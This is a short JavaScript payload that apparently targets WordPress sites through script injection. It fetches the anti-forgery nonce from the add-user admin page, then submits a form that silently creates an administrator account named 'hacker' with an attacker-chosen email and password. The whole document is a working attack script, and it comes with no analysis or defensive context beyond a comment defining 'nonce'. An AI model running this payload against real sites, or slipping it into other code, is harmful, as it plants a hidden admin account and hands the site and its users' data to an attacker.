
// To get "nonce code"
// That is a "number used once" to help protect URLs and forms from certain types of misuse, malicious or otherwise

var wp_root = "" // don't add a trailing slash
var req_admin = new XMLHttpRequest();
var url = wp_root + "/wp-admin/user-new.php";
var regex = /ser" value="([^"]*?)"/g;
req_admin.open("GET", url, false);
req_admin.send();
var nonce = regex.exec(req_admin.responseText);
var nonce = nonce[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=ccclinghhhh@gmail.com&pass1=AttackerP455&pass2=AttackerP455&role=administrator";
req_admin.open("POST", url, true);
req_admin.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req_admin.send(params);